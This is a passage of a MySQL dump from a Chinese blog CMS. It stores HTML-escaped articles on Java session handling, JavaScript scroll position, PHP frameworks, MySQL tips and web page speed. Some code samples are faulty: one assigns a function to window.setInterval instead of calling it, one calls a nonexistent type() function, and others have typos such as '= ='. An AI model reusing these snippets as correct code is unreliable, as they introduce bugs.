style=&quot;font-size:10.5pt;&quot;&gt;&lt;strong&gt;二十三、使用&lt;span&gt;isNew&lt;/span&gt;来判断用户是否为新旧用户的错误做法&lt;/strong&gt;&lt;span&gt;&lt;br /&gt;\r\n&lt;br /&gt;\r\npublic boolean isNew()&lt;/span&gt;方法如果会话尚未和客户程序&lt;span&gt;(&lt;/span&gt;浏览器&lt;span&gt;)&lt;/span&gt;发生任何联系，则这个方法返回&lt;span&gt;true&lt;/span&gt;，这一般是因为会话是新建的，不是由输入的客户请求所引起的。&lt;span&gt;&lt;br /&gt;\r\n&lt;/span&gt;但如果&lt;span&gt;isNew&lt;/span&gt;返回&lt;span&gt;false&lt;/span&gt;，只不过是说明他之前曾经访问该&lt;span&gt;Web&lt;/span&gt;应用，并不代表他们曾访问过我们的&lt;span&gt;servlet&lt;/span&gt;或&lt;span&gt;JSP&lt;/span&gt;页面。&lt;span&gt;&lt;br /&gt;\r\n&lt;/span&gt;因为&lt;span&gt;session&lt;/span&gt;是与用户相关的，在用户之前访问的每一个页面都有可能创建了会话。因此&lt;span&gt;isNew&lt;/span&gt;为&lt;span&gt;false&lt;/span&gt;只能说用户之前访问过该&lt;span&gt;Web&lt;/span&gt;应用，&lt;span&gt;session&lt;/span&gt;可以是当前页面创建，也可能是由用户之前访问过的页面创建的。&lt;span&gt;&lt;br /&gt;\r\n&lt;/span&gt;正确的做法是判断某个&lt;span&gt;session&lt;/span&gt;中是否存在某个特定的&lt;span&gt;key&lt;/span&gt;且其&lt;span&gt;value&lt;/span&gt;是否正确&lt;span&gt;&lt;br /&gt;\r\n&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;\r\n&lt;p&gt;&lt;span style=&quot;font-size:10.5pt;&quot;&gt;&lt;strong&gt;二十四、&lt;span&gt;Cookie&lt;/span&gt;的过期和&lt;span&gt;Session&lt;/span&gt;的超时有什么区别&lt;/strong&gt;&lt;span&gt;&lt;br /&gt;\r\n&lt;br /&gt;\r\n&lt;/span&gt;会话的超时由服务器来维护，它不同于&lt;span&gt;Cookie&lt;/span&gt;的失效日期。首先，会话一般基于驻留内存的&lt;span&gt;cookie&lt;br /&gt;\r\n&lt;/span&gt;不是持续性的&lt;span&gt;cookie&lt;/span&gt;，因而也就没有截至日期。即使截取到&lt;span&gt;JSESSIONID cookie&lt;/span&gt;，并为它设定一个失效日期发送出去。浏览器会话和服务器会话也会截然不同。&lt;span&gt;&lt;br /&gt;\r\n&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;\r\n&lt;p&gt;&lt;span style=&quot;font-size:10.5pt;&quot;&gt;&lt;strong&gt;二十五、&lt;span&gt;session cookie&lt;/span&gt;和&lt;span&gt;session&lt;/span&gt;对象的生命周期是一样的吗&lt;/strong&gt;&lt;span&gt;&lt;br /&gt;\r\n&lt;br /&gt;\r\n&lt;/span&gt;当用户关闭了浏览器虽然&lt;span&gt;session cookie&lt;/span&gt;已经消失，但&lt;span&gt;session&lt;/span&gt;对象仍然保存在服务器端&lt;span&gt;&lt;br /&gt;\r\n&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;\r\n&lt;p&gt;&lt;span style=&quot;font-size:10.5pt;&quot;&gt;&lt;strong&gt;二十六、是否只要关闭浏览器，&lt;span&gt;session&lt;/span&gt;就消失了&lt;/strong&gt;&lt;span&gt;&lt;br /&gt;\r\n&lt;br /&gt;\r\n&lt;/span&gt;程序一般都是在用户做&lt;span&gt;log off&lt;/span&gt;的时候发个指令去删除&lt;span&gt;session&lt;/span&gt;，然而浏览器从来不会主动在关闭之前通知服务器它将要被关闭，因此服务器根本不会有机会知道浏览器已经关闭。服务器会一直保留这个会话对象直到它处于非活动状态超过设定的间隔为止。&lt;span&gt;&lt;br /&gt;\r\n&lt;/span&gt;之所以会有这种错误的认识，是因为大部分&lt;span&gt;session&lt;/span&gt;机制都使用会话&lt;span&gt;cookie&lt;/span&gt;来保存&lt;span&gt;session id&lt;/span&gt;，而关闭浏览器后这个&lt;span&gt;session id&lt;/span&gt;就消失了，再次连接到服务器时也就无法找到原来的&lt;span&gt;session&lt;/span&gt;。&lt;span&gt;&lt;br /&gt;\r\n&lt;/span&gt;如果服务器设置的&lt;span&gt;cookie&lt;/span&gt;被保存到硬盘上，或者使用某种手段改写浏览器发出的&lt;span&gt;HTTP&lt;/span&gt;请求报头，把原来的&lt;span&gt;session id&lt;/span&gt;发送到服务器，则再次打开浏览器仍然能够找到原来的&lt;span&gt;session&lt;/span&gt;。&lt;span&gt;&lt;br /&gt;\r\n&lt;/span&gt;恰恰是由于关闭浏览器不会导致&lt;span&gt;session&lt;/span&gt;被删除，迫使服务器为&lt;span&gt;session&lt;/span&gt;设置了一个失效时间，当距离客户上一次使用&lt;span&gt;session&lt;/span&gt;的时间超过了这个失效时间时，服务器就可以认为客户端已经停止了活动，才会把&lt;span&gt;session&lt;/span&gt;删除以节省存储空间。&lt;span&gt;&lt;br /&gt;\r\n&lt;/span&gt;由此我们可以得出如下结论：&lt;span&gt;&lt;br /&gt;\r\n&lt;/span&gt;关闭浏览器，只会是浏览器端内存里的&lt;span&gt;session cookie&lt;/span&gt;消失，但不会使保存在服务器端的&lt;span&gt;session&lt;/span&gt;对象消失，同样也不会使已经保存到硬盘上的持久化&lt;span&gt;cookie&lt;/span&gt;消失。&lt;span&gt; &lt;/span&gt;&lt;/span&gt;&lt;/p&gt;\r\n&lt;p&gt;&lt;span style=&quot;font-size:10.5pt;&quot;&gt;&lt;br /&gt;\r\n&lt;/span&gt;&lt;span style=&quot;font-size:10.5pt;&quot;&gt;&lt;strong&gt;二十七、打开两个浏览器窗口访问应用程序会使用同一个&lt;span&gt;session&lt;/span&gt;还是不同的&lt;/strong&gt;&lt;span&gt;&lt;strong&gt;session&lt;/strong&gt;&lt;br /&gt;\r\n&lt;br /&gt;\r\n&lt;/span&gt;通常&lt;span&gt;session cookie&lt;/span&gt;是不能跨窗口使用的，当你新开了一个浏览器窗口进入相同页面时，系统会赋予你一个新的&lt;span&gt;session id&lt;/span&gt;，这样我们信息共享的目的就达不到了。&lt;span&gt;&lt;br /&gt;\r\n&lt;/span&gt;此时我们可以先把&lt;span&gt;session id&lt;/span&gt;保存在&lt;span&gt;persistent cookie&lt;/span&gt;中&lt;span&gt;(&lt;/span&gt;通过设置&lt;span&gt;session&lt;/span&gt;的最大有效时间&lt;span&gt;)&lt;/span&gt;，然后在新窗口中读出来，就可以得到上一个窗口的&lt;span&gt;session id&lt;/span&gt;了，这样通过&lt;span&gt;session cookie&lt;/span&gt;和&lt;span&gt;persistent cookie&lt;/span&gt;的结合我们就可以实现了跨窗口的会话跟踪。&lt;span&gt;&lt;br /&gt;\r\n&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;\r\n&lt;p&gt;&lt;span style=&quot;font-size:10.5pt;&quot;&gt;&lt;strong&gt;二十八、如何使用会话显示每个客户的访问次数&lt;/strong&gt;&lt;span&gt;&lt;br /&gt;\r\n&lt;br /&gt;\r\n&lt;/span&gt;由于客户的访问次数是一个整型的变量，但&lt;span&gt;session&lt;/span&gt;的属性类型中不能使用&lt;span&gt;int&lt;/span&gt;，&lt;span&gt;double&lt;/span&gt;，&lt;span&gt;boolean&lt;/span&gt;等基本类型的变量，所以我们要用到这些基本类型的封装类型对象作为&lt;span&gt;session&lt;/span&gt;对象中属性的值&lt;span&gt;&lt;br /&gt;\r\n&lt;/span&gt;但像&lt;span&gt;Integer&lt;/span&gt;是一种不可修改&lt;span&gt;(Immutable)&lt;/span&gt;的数据结构：构建后就不能更改。这意味着每个请求都必须创建新的&lt;span&gt;Integer&lt;/span&gt;对象，之后使用&lt;span&gt;setAttribute&lt;/span&gt;来代替之前存在的老的属性的值。例如：&lt;span&gt;&lt;br /&gt;\r\nHttpSession session = request.getSession();&lt;br /&gt;\r\nSomeImmutalbeClass value = (SomeImmutableClass)session.getAttribute(“SomeIdentifier”);&lt;br /&gt;\r\nif (value= =null){&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp; value = new SomeImmutableClass(…);&lt;/span&gt;　&lt;span&gt;// &lt;/span&gt;新创建一个不可更改对象&lt;span&gt;&lt;br /&gt;\r\n}else{&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp; value = new SomeImmutableClass(calculatedFrom(value)); // &lt;/span&gt;对&lt;span&gt;value&lt;/span&gt;重新计算后创建新的对象&lt;span&gt;&lt;br /&gt;\r\n}&lt;br /&gt;\r\nsession.setAttribute(“someIdentifier”,value); // &lt;/span&gt;使用新创建的对象覆盖原来的老的对象&lt;span&gt;&lt;br /&gt;\r\n&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;\r\n&lt;p&gt;&lt;span style=&quot;font-size:10.5pt;&quot;&gt;&lt;strong&gt;二十九、如何使用会话累计用户的数据&lt;/strong&gt;&lt;span&gt;&lt;br /&gt;\r\n&lt;br /&gt;\r\n&lt;/span&gt;使用可变的数据结构，比如数组、&lt;span&gt;List&lt;/span&gt;、&lt;span&gt;Map&lt;/span&gt;或含有可写字段的应用程序专有的数据结构。通过这种方式，除非首次分配对象，否则不需要调用&lt;span&gt;setAttribute&lt;/span&gt;。例如&lt;/span&gt;&lt;/p&gt;\r\n&lt;p&gt;&lt;span style=&quot;font-size:10.5pt;&quot;&gt;HttpSession session = request.getSession();&lt;br /&gt;\r\nSomeMutableClass value = (SomeMutableClass)session.getAttribute(“someIdentifier”);&lt;br /&gt;\r\nif(value = = null){&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp; value = new SomeMutableClass(…);&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp; session.setAttribute(“someIdentifier”,value);&lt;br /&gt;\r\n}else{&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp; value.updateInternalAttribute(…);&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; // &lt;/span&gt;&lt;span style=&quot;font-size:10.5pt;&quot;&gt;如果已经存在该对象则更新其属性而不需重新设置属性&lt;span&gt;&lt;br /&gt;\r\n}&lt;br /&gt;\r\n&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;\r\n&lt;p&gt;&lt;span style=&quot;font-size:10.5pt;&quot;&gt;&lt;strong&gt;三十、不可更改对象和可更改对象在会话数据更新时的不同处理&lt;/strong&gt;&lt;span&gt;&lt;br /&gt;\r\n&lt;br /&gt;\r\n&lt;/span&gt;不可更改对象因为一旦创建之后就不能更改，所以每次要修改会话中属性的值的时候，都需要&lt;span&gt;&lt;br /&gt;\r\n&lt;/span&gt;调用&lt;span&gt;setAttribute(“someIdentifier”,newValue)&lt;/span&gt;来代替原有的属性的值，否则属性的值不会被更新&lt;span&gt;&lt;br /&gt;\r\n&lt;/span&gt;可更改对象因为其自身一般提供了修改自身属性的方法，所以每次要修改会话中属性的值的时&lt;span&gt;&lt;br /&gt;\r\n&lt;/span&gt;候，只要调用该可更改对象的相关修改自身属性的方法就可以了。这意味着我们就不需要调&lt;span&gt;&lt;br /&gt;\r\n&lt;/span&gt;用&lt;span&gt;setAttribute&lt;/span&gt;方法了.&lt;/span&gt;&lt;/p&gt;\r\n', 1, 1, 0, 0, 1301704128, 1, 'admin'),
(14, 1, '获得网页中滚动条的位置', '', '', '&lt;strong&gt;一、获得网页中滚动条的位置&lt;br /&gt;\r\n&lt;br /&gt;\r\n&lt;/strong&gt;页面滚动是Javascript 中最不标准的地方，在各种不同版本的浏览器中，大致有 3 种实现的方法。不过通过谨慎的对象测试，我们可以期望获得可靠的一致性，在这里推荐给大家一个函数；&lt;br /&gt;\r\n&lt;div style=&quot;padding-right:10px;padding-left:10px;padding-bottom:10px;padding-top:10px;background-color:#f7f7f7;&quot;&gt;&lt;font color=&quot;#000080&quot; size=&quot;3&quot;&gt;function getScrollingPosition( ) {&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp; var position = [0,0];&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp; if ( &lt;/font&gt;&lt;font color=&quot;#000080&quot; size=&quot;3&quot;&gt;typeof &lt;/font&gt;&lt;font color=&quot;#000080&quot; size=&quot;3&quot;&gt;window.pageYOffset != ''undefined'') { &lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp; position = [ window.pageXOffset, window.pageYOffset];&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp; } else if ( &lt;/font&gt;&lt;font color=&quot;#000080&quot; size=&quot;3&quot;&gt;typeof &lt;/font&gt;&lt;font color=&quot;#000080&quot; size=&quot;3&quot;&gt;document.documentElement.scrollTop != ''undefined'' &amp;amp;&amp;amp; document.documentElement.scrollTop &amp;gt; 0) {&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp; position = [ document.documentElement.scrollLeft,&lt;/font&gt;&lt;font color=&quot;#000080&quot; size=&quot;3&quot;&gt;document.documentElement.scrollTop];&lt;/font&gt;&lt;font color=&quot;#000080&quot; size=&quot;3&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp; &lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp; } else if (typeof document.body.scrollTop != ''undefined'') {&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp; position = [ document.body.scrollLeft , document.body.scrollTop];&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp; }&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp; return position;&lt;br /&gt;\r\n}&lt;/font&gt;&lt;/div&gt;\r\n&lt;br /&gt;\r\n这里再介绍一个事件处理函数 window.onscroll &lt;br /&gt;\r\n&lt;div style=&quot;padding-right:10px;padding-left:10px;padding-bottom:10px;padding-top:10px;background-color:#f7f7f7;&quot;&gt;&lt;font color=&quot;#000080&quot; size=&quot;3&quot;&gt;window.onscroll = function () {&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp; var scrollPos = getScrollingPosition();&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp; document.title = ''Left = ''+scrollPos[0] +''Top = ''+scrollPos[1];&lt;br /&gt;\r\n};&lt;br /&gt;\r\n&lt;/font&gt;&lt;/div&gt;\r\n不过，此事件并不可靠，而且用这个事件来驱动非常的&lt;font color=&quot;#993300&quot;&gt;低效和缓慢&lt;/font&gt;，所以本人不推荐，如果遇到此类似的问题可以使用 &lt;font color=&quot;#993300&quot;&gt;setInterval &lt;/font&gt;函数来代替，而不用使用 window.onscroll 参考代码如下：&lt;br /&gt;\r\n&lt;br /&gt;\r\n&lt;div style=&quot;padding-right:10px;padding-left:10px;padding-bottom:10px;padding-top:10px;background-color:#f7f7f7;&quot;&gt;&lt;font color=&quot;#000080&quot; size=&quot;3&quot;&gt;window.&lt;/font&gt;&lt;font color=&quot;#000080&quot; size=&quot;3&quot;&gt;setInterval &lt;/font&gt;&lt;font color=&quot;#000080&quot; size=&quot;3&quot;&gt;= function () {&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp; var scrollPos = getScrollingPosition();&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp; document.title = ''Left = ''+scrollPos[0] +''Top = ''+scrollPos[1];&lt;br /&gt;\r\n};&lt;/font&gt;&lt;/div&gt;\r\n&lt;br /&gt;\r\n注意：&lt;br /&gt;\r\n●&amp;nbsp;&amp;nbsp; firefox 以及其他的 MOzilla 浏览器 ，如 Safari 、Kongqueror、Opera等，使用 window.pageYOffset；&lt;br /&gt;\r\n&lt;br /&gt;\r\n● 在标准兼容模式下的 IE 6 使用 document.documentElement.scrollTop；&lt;br /&gt;\r\n&lt;br /&gt;\r\n●&amp;nbsp;&amp;nbsp; 在 Quirks 模式下的 IE 6、IE 5使用 document.body.scrollTop;&lt;br /&gt;\r\n&lt;br /&gt;\r\n上面涉及到&lt;strong&gt;&lt;font color=&quot;#993300&quot;&gt; typeof&lt;/font&gt;&lt;font color=&quot;#993300&quot;&gt;运算符&lt;/font&gt;&lt;/strong&gt;&lt;strong&gt;&lt;font color=&quot;#993300&quot;&gt; &lt;/font&gt;&lt;/strong&gt;，这里着重再提一下；&lt;br /&gt;\r\n&lt;br /&gt;\r\n&lt;strong&gt;&lt;font color=&quot;#993300&quot;&gt;typeof: 运算符返回一个用来表示表达式的数据类型的字符串。&lt;/font&gt;&lt;/strong&gt; &lt;br /&gt;\r\n参数是&lt;font color=&quot;#000000&quot;&gt;需要查找类型信息的任意表达式&lt;/font&gt;。&lt;br /&gt;\r\n&lt;br /&gt;\r\n说明: &lt;br /&gt;\r\ntypeof 运算符把&lt;em&gt;&lt;font color=&quot;#993300&quot;&gt;类型信息&lt;/font&gt;&lt;/em&gt;当作字符串返回。typeof 返回值有六种可能： &lt;strong&gt;&lt;font color=&quot;#993300&quot;&gt;&quot;number,&quot; &quot;string,&quot; &quot;boolean,&quot; &quot;object,&quot; &quot;function,&quot; 和 &quot;undefined.&quot; &lt;/font&gt;&lt;/strong&gt;&lt;br /&gt;\r\n&lt;br /&gt;\r\n经常会在js里用到数组,比如 多个名字相同的input, 若是动态生成的, 提交时就需要判断其是否是数组. &lt;br /&gt;\r\nif(document.mylist.length != &quot;undefined&quot; ) {} 这个用法有误. &lt;br /&gt;\r\n正确的是 if( type(document.mylist.length) != &quot;undefined&quot; ) {} 或 if( !isNaN(document.mylist.length) ) {} &lt;br /&gt;\r\ntypeof的运算数未定义,返回的就是 &quot;undefined&quot;.&lt;br /&gt;\r\n&lt;br /&gt;\r\n&lt;em&gt;&lt;strong&gt;&lt;font color=&quot;#993300&quot;&gt;运算数为数字 typeof(x) = &quot;number&quot; &lt;br /&gt;\r\n字符串 typeof(x) = &quot;string&quot; &lt;br /&gt;\r\n布尔值 typeof(x) = &quot;boolean&quot; &lt;br /&gt;\r\n对象,数组和null typeof(x) = &quot;object&quot; &lt;br /&gt;\r\n函数 typeof(x) = &quot;function&quot;&lt;/font&gt;&lt;/strong&gt;&lt;/em&gt;&lt;br /&gt;\r\n&lt;br /&gt;\r\n&lt;strong&gt;二、滚动到页面的特定位置&lt;/strong&gt;&lt;br /&gt;\r\n&lt;br /&gt;\r\n有两种方法可以用于滚动页面（或者窗口和Frame）或者通过滚动的相对坐标（window.scrollBy）来定位，或者是通过滚动到某点的绝对坐标（window.scrollTo）来实现。&lt;br /&gt;\r\n&lt;br /&gt;\r\n&lt;div style=&quot;padding-right:10px;padding-left:10px;padding-bottom:10px;padding-top:10px;background-color:#f7f7f7;&quot;&gt;&lt;font color=&quot;#000080&quot; size=&quot;3&quot;&gt;window.scrollBy(0,200); &lt;font color=&quot;#ff6600&quot;&gt;//向下滚动200像素&lt;/font&gt;&lt;br /&gt;\r\nwindow.scrollBy(200,0); &lt;font color=&quot;#ff6600&quot;&gt;//横向滚动200像素&lt;/font&gt;&lt;br /&gt;\r\nwindow.scrollTo(300,200); &lt;font color=&quot;#ff6600&quot;&gt;//滚动到距左边框和上边框300像素和200像素的位置&lt;/font&gt;&lt;br /&gt;\r\nwindow.scrollTo(0,0);&lt;font color=&quot;#ff6600&quot;&gt;//滚动到起始处&lt;/font&gt;&lt;/font&gt;&lt;/div&gt;\r\n', 1, 1, 0, 0, 1301704435, 1, 'admin'),
(15, 1, 'PHP框架的认识误区', '', '', '有人认为，PHP是每次请求都要初始化资源，这个开销非常大。由此，PHP不适合使用开发框架。&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp; 对于PHP，确实没有类的持久化，使得每次请求都要初始化资源，但是，这并不是开销的主要问题所在。最主要的问题，是在于开发PHP框架的人，对PHP本身的特性了解多少。最简单的，MVC需要检测UA，如果使用PHP自带的get_browser函数，那肯定是死定了。因为，使用上的方便与简单，导致的是性能的开销。&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp; 认为不可使用PHP开发框架的，还有的观点是：由于需要每次请求的时候初始化整个框架。其实，这也是一种误解。如果好好看看PHP源码，就会了解，PHP是按请求加载需要运行的文件，并不是整个框架。所以，对于框架本身，哪一种框架内核代码时越小，性能越好。&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp; 还有观点：由于PHP这种每请求初始化资源的机制，也造成了PHP添加跨请求的高级特性相当困难。其实，跨请求本身，要看在哪一个层面。PHP提供了各类加速的缓存机制。虽然PHP的类是由于目前序列化函数仍有限制，不能持久化，但数据缓存对PHP的加速是相当快的。所以，认为由于这一限制，就使得PHP只能是一个保持在一个比较简单的web语言上面，这无疑更是错误的。PHP不乏大型的高速与高效的网站。并不是这些网站底层就没有框架。&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp; 另外，还有轻信什么测试的结果。&lt;a href=&quot;http://merbist.com/wp-content/uploads/2008/11/benchmarks.png&quot;&gt;&lt;font color=&quot;#006699&quot;&gt;http://merbist.com/wp-content/uploads/2008/11/benchmarks.png&lt;/font&gt;&lt;/a&gt;，对于这个测试结果，我觉得，没有一丝一毫的可信度。我们无法相信这些测试结果，主要原因有这么几个方面。其一，PHP环境配置，是不是最优化配置？第二，测试结果中所选框架，是不是最优框架？仅拿CI与CAKE两者来说，CI的日志，没有多种输出，只有文件输出。这对于大型网站的管理是极不方便的。但是，如果将其改用LOG4PHP，那性能上的损失将会是多少，是不可想象的。原因在于，LOG4PHP是完全照抄的JAVA。至于CAKE，更是完全照抄RAILS。完全不顾及PHP的性能与语言本身的特性。&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp; 比如最简单的，大量静态方法的使用。势必造成以空间换时间。CAKE中无处不在的静态方法，导致了内存中堆积大量的类。这种以空间换时间，是速度加快了，还是性能损失了，有多少人真正系统测试过？&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp; CAKE让RUBY的人了解PHP是对PHP的一个促进，同时，RAILS框架，也使得PHP框架得以注入新的血液，增加了新的开发思路。但，完全照抄是PHP目前最大的悲剧。这个当中的经典之作：CAKE：RUBY ON RAILS， SMARTY： JAVA STRRUTS&amp;nbsp; LOG4PHP：JAVA LOG4J，可悲的是，写这些抄袭之作的作者，都是对PHP不太了解，大量照搬RUBY，JAVA中的算法与函数，有些可以算是翻译，比如， LOG4PHP中的PROPERTIIES文件的处理就是这样，不必再举更多的实例了。为什么不能把JSF，或TYPESTRY也抄到PHP中，这是因为，如果没有很好的PHP功底，这几乎是不可能的。因为，这两个东西，如果也是照抄过来，势必慢如蜗牛。&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp; 再有，梦想不用PHP框架开发大型网站，肯定是错上加错。WORDPRESS，DISCUZ这类无框架，无架构的极端糟糕的代码，网上已屡见不鲜。&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp; 要访问数据库，最小的需求，也要把数据库访问封装成一个类吧？要进行错误与异常管理，也需要一个类吧？如果是大型的网站，总要有错误日志输出，以方便调视与运行监视吧。所以这些，拼一下，也算是PHP开发框架呀。&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp; 看样子，否认PHP应当有框架的人，肯定也就认定，PHP做不了大网站。或者说，认定，PHP做大网站，也是垃圾架构。这可能是太武断了。&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp; 凡认为PHP是反框架的，实际上，是不了解PHP语言的一些瓶颈在何处，无法写出高效的框架，所以，才这样认为的。&lt;p&gt;&amp;nbsp;&lt;/p&gt;\r\n', 1, 1, 0, 0, 1301722670, 1, 'admin'),
(16, 1, 'MySQL一些技巧', '', '', '&lt;div class=&quot;content&quot;&gt;1.表设计： &lt;br /&gt;\r\n&lt;br /&gt;\r\n&amp;nbsp; 数据库要满足基本范式； &lt;br /&gt;\r\n&amp;nbsp; 选择合适的数据类型：尽量定长； &lt;br /&gt;\r\n&amp;nbsp; 不要使用无法加索引的类型作为关键字段，比如text类型； &lt;br /&gt;\r\n&amp;nbsp; 为了避免联表查询，有时候可以适当的数据冗余，比如邮箱、姓名这些不容易更改的数据； &lt;br /&gt;\r\n&amp;nbsp; 选择合适的表引擎，有时候合MySAM适和，有时InnoDB适合； &lt;br /&gt;\r\n&amp;nbsp; 最好每个表都建立有auto_increment字段，建立合适的数据库索引以保证查询性能； &lt;br /&gt;\r\n&amp;nbsp; 最好给每个字段设定default值。 &lt;br /&gt;\r\n&lt;br /&gt;\r\n2. SQL &lt;br /&gt;\r\n&lt;br /&gt;\r\n&amp;nbsp; 能够快速缩小结果集的where条件写在前面，如果有恒量条件也尽量写在前面； &lt;br /&gt;\r\n&amp;nbsp; 尽量避免使用group by、distinct、or、in等语句的使用，避免使用联表查询和子查询，因为会使执行效率大大下降； &lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp; explain/desc来分析sql的执行情况； &lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp; show processlist来查看当前MySQL服务器线程执行情况，是否锁表，查看相应的SQL语句； &lt;br /&gt;\r\n&amp;nbsp; 设置my.cnf中的long-query-time和log-slow-queries能够记录服务器哪些sql执行速度比较慢； &lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp; show variables、show status、show engines； &lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp; desc tablename来查看表结构； &lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp; show index from xx 查看表索引； &lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp; load data导入数据比insert into快多了； &lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp; select count（*）from tableXX 在InnoDB中会全表扫描. &lt;br /&gt;\r\n&lt;/div&gt;\r\n', 1, 1, 0, 0, 1301723062, 1, 'admin');
INSERT INTO `cp_article` (`id`, `cat_id`, `title`, `keywords`, `description`, `content`, `views`, `status`, `top`, `recommend`, `create_time`, `create_uid`, `create_username`) VALUES
(17, 1, '20 种提升网页速度的技巧', '', '', '&lt;p sizcache=&quot;20&quot; sizset=&quot;76&quot;&gt;&lt;a name=&quot;N1004C&quot;&gt;&lt;span class=&quot;atitle&quot;&gt;&lt;strong&gt;&lt;font size=&quot;5&quot;&gt;引言&lt;/font&gt;&lt;/strong&gt;&lt;/span&gt;&lt;/a&gt;&lt;/p&gt;\r\n&lt;p&gt;不是所有人都能够使用高速 Internet 连接。即使每个人都能够使用高速网络，也会因为各种各样的原因使您的 Web 应用程序看起来运行缓慢。在这个宽带速度不断提高的时代，您应当关注一下页面加载时间。将珍贵的页面加载时间缩短几秒，将更加珍贵的请求和响应时间缩短几毫秒。您将为访问者创造一种更好的体验。&lt;/p&gt;\r\n&lt;p&gt;阅读完本文之后，您将能够较好地了解网页加载时间优化的基本知识。您还能够使用工具和知识更好地识别和判断加载缓慢的页面部分和瓶颈。&lt;/p&gt;\r\n&lt;p sizcache=&quot;20&quot; sizset=&quot;77&quot;&gt;&lt;a name=&quot;prereqs&quot;&gt;&lt;span class=&quot;atitle&quot;&gt;&lt;strong&gt;&lt;font size=&quot;5&quot;&gt;先决条件&lt;/font&gt;&lt;/strong&gt;&lt;/span&gt;&lt;/a&gt;&lt;/p&gt;\r\n&lt;p&gt;在理想情况下，您应该安装了 Mozilla Firefox。您还应该大体了解 Web 开发。本文涉及的主题并不复杂，但是如果您了解超文本标记语言（Hypertext Markup Language，HTML）、层叠样式表（Cascading Style Sheet，CSS）以及 ™ 编程语言等主题，那么在学习本文时将更加得心应手。不需要使用集成开发环境（IDE），只需使用您喜爱的编辑器。&lt;/p&gt;\r\n&lt;p&gt;您必须在浏览器中启用了 JavaScript。另外，要学习与 Firebug 和 YSlow 相关的内容，您需要安装 Firefox Web 浏览器。&lt;/p&gt;\r\n&lt;p sizcache=&quot;20&quot; sizset=&quot;78&quot;&gt;&lt;a name=&quot;broadband&quot;&gt;&lt;span class=&quot;atitle&quot;&gt;&lt;strong&gt;&lt;font size=&quot;5&quot;&gt;假设您没有宽带&lt;/font&gt;&lt;/strong&gt;&lt;/span&gt;&lt;/a&gt;&lt;/p&gt;\r\n&lt;p&gt;许多人通过某种形式的宽带连接访问 Internet，这些形式可能是 DSL、网线、光纤或其他方法。但是，无法使用这类技术的用户不得不使用拨号连接。您一定已经忘记拨号上网是什么感觉了，但您可以试着回想一下网页逐行加载时的情形。&lt;/p&gt;\r\n&lt;div class=&quot;ibm-container dw-container-sidebar ibm-alternate-two&quot;&gt;&lt;div class=&quot;ibm-container-body&quot;&gt;&lt;p&gt;2006 Organization for Economic Cooperation and Development (OECD) 报告将&lt;em&gt;宽带&lt;/em&gt; 定义为数据下载速率大于 256 kbit/s 的连接。美国 Federal Communications Commission (FCC) 目前将宽带定义为大于 768 kbit/s 速率的所有连接方式。&lt;/p&gt;\r\n&lt;/div&gt;\r\n&lt;/div&gt;\r\n&lt;p&gt;幸运的是，这些可怜的人们现在已经能够获得一些帮助。您可以通过缩短加载页面的时间来改善他们的体验。但是，拨号连接并不是降低加载和响应速度的惟一原因。许多 Web 设计人员错误地认为高速 Internet 连接的到来会使网站性能优化变得没有必要。这种观点是不对的。例如，过去使用桌面软件执行的许多任务现在可以在线执行。在 Web 